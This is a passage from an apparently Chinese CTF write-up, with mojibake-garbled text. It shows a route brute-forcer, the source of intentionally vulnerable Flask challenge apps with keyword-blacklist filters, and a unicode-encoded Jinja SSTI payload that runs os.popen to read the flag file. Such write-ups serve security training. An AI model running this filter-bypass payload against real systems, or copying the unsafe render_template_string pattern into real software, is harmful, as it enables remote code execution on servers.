</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;å¼€å§‹è·¯ç”±çˆ†ç ´ï¼Œç›®æ ‡ä¸º4ä½å°å†™å­—æ¯ç»„åˆ...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">THREADS</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">futures</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">route</span> <span class="ow">in</span> <span class="n">generate_routes</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">found_routes</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">futures</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">brute_worker</span><span class="p">,</span> <span class="n">route</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æ‰“å°æœ€ç»ˆç»“æœ</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== çˆ†ç ´ç»“æœ ===&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">found_routes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">found_routes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;è·¯ç”±</span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">TARGET</span><span class="si">}{</span><span class="n">route</span><span class="si">}</span><span class="s2"> (å“åº”é•¿åº¦: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;æœªå‘ç°æœ‰æ•ˆè·¯ç”±&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæºç æç¤ºæœ‰å‚æ•°ï¼Œç›´æ¥ç”¨arjunçˆ†ç ´å¾—åˆ°filename</p>
<img src="image-20250416102540954.png" alt="image-20250416102540954" style="zoom:50%;" />
<h4 id="è§£æ³•ä¸€ssti">è§£æ³•ä¸€ï¼šssti
</h4><p>ç„¶åç›´æ¥è¯»æºç app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_from_directory</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">a.b.c.d.secret</span> <span class="kn">import</span> <span class="n">secret_key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">black_list</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="s1">&#39;base&#39;</span><span class="p">,</span><span class="s1">&#39;globals&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_typable</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span>
</span></span><span class="line"><span class="cl">    <span class="n">typable_chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">whitespace</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">typable_chars</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/jingu&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">greet</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">template1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">template2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹&lt;br&gt;&lt;img src=&#34;{{  url_for(&#34;static&#34;, filename=&#34;3.jpeg&#34;) }}&#34; alt=&#34;Image&#34;&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_typable</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">k</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">k</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">secret_key</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="n">name</span> <span class="ow">and</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">2</span><span class="p">:]):</span>
</span></span><span class="line"><span class="cl">                <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§&lt;br&gt;&lt;br&gt;å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ&lt;br&gt;&lt;br&gt;&lt;img src=&#34;{{  url_for(&#34;static&#34;, filename=&#34;4.jpeg&#34;) }}&#34; alt=&#34;Image&#34;&gt;&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">template1</span> <span class="o">=</span> <span class="s2">&#34;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ{{}}â€&lt;br&gt;æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†&lt;br&gt;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">template</span><span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;ç›´é¢&#34;</span><span class="p">,</span><span class="s2">&#34;{{&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;å¤©å‘½&#34;</span><span class="p">,</span><span class="s2">&#34;}}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">template</span> <span class="o">=</span> <span class="n">template</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;cat&#34;</span> <span class="ow">in</span> <span class="n">template</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">template2</span> <span class="o">=</span> <span class="s1">&#39;&lt;br&gt;æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ&lt;br&gt;&lt;br&gt;&lt;img src=&#34;{{  url_for(&#34;static&#34;, filename=&#34;2.jpeg&#34;) }}&#34; alt=&#34;Image&#34;&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template1</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">error_message</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š&lt;br&gt;</span><span class="si">{</span><span class="n">template</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">error_message</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hint&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hinter</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span><span class="o">=</span><span class="s2">&#34;hintï¼š&lt;br&gt;æœ‰ä¸€ä¸ªç”±4ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„è·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/aazz&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">finder</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">filename</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;file.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">filename</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">isalnum</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;åªå…è®¸å­—æ¯å’Œæ•°å­—ï¼&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">content</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;è·¯å¾„ä¸å­˜åœ¨æˆ–è€…è·¯å¾„éæ³•&#39;</span><span class="p">}),</span> <span class="mi">404</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹æºç å‘ç°ç›´é¢å¤©å‘½æ›¿æ¢æˆäº†{{}}ã€‚ç„¶åæŸ¥çœ‹ä¸€ä¸‹secret_keyã€‚å—¯æ²¡é”™äº†</p>
<img src="image-20250416105213161.png" alt="image-20250416105213161" style="zoom:50%;" />
<p>æ‰“ç›´é¢2*2å¤©å‘½ï¼Œå›æ˜¾</p>
<img src="image-20250416104136079.png" alt="image-20250416104136079" style="zoom:50%;" />
<p>æ¥ä¸‹æ¥å°±æ˜¯æ‰“sstiï¼Œç¼–ç ç»•è¿‡äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ç›´é¢lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u006f\u0073&#34;)|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;cat /fla?&#34;)|attr(&#34;\u0072\u0065\u0061\u0064&#34;)()å¤©å‘½
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="è§£æ³•äºŒç›®å½•ç©¿è¶Š">è§£æ³•äºŒï¼šç›®å½•ç©¿è¶Š
</h4><p><img src="/p/2025-tgctf-write.up/image-20250416110219098.png"
	width="1545"
	height="212"
	srcset="/p/2025-tgctf-write.up/image-20250416110219098_hu_570f89bc4bb27b33.png 480w, /p/2025-tgctf-write.up/image-20250416110219098_hu_1af444248cbbed3.png 1024w"
	loading="lazy"
	
		alt="image-20250416110219098"
	
	
		class="gallery-image" 
		data-flex-grow="728"
		data-flex-basis="1749px"
	
></p>
<h3 id="ç›´é¢å¤©å‘½å¤ä»‡"><strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong>
</h3><p>è®¿é—®aazzï¼Œç›´æ¥å¾—åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_from_directory</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">a.b.c.d.secret</span> <span class="kn">import</span> <span class="n">secret_key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">black_list</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;lipsum&#39;</span><span class="p">,</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">,</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;map&#39;</span><span class="p">,</span><span class="s1">&#39;chr&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">,</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="s1">&#39;pop&#39;</span><span class="p">,</span><span class="s1">&#39;include&#39;</span><span class="p">,</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="s1">&#39;base&#39;</span><span class="p">,</span><span class="s1">&#39;globals&#39;</span><span class="p">,</span><span class="s1">&#39;_.&#39;</span><span class="p">,</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;application&#39;</span><span class="p">,</span><span class="s1">&#39;getitem&#39;</span><span class="p">,</span><span class="s1">&#39;request&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;init&#39;</span><span class="p">,</span> <span class="s1">&#39;arg&#39;</span><span class="p">,</span> <span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_typable</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span>
</span></span><span class="line"><span class="cl">    <span class="n">typable_chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">whitespace</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">typable_chars</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/jingu&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">greet</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">template1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">template2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span>
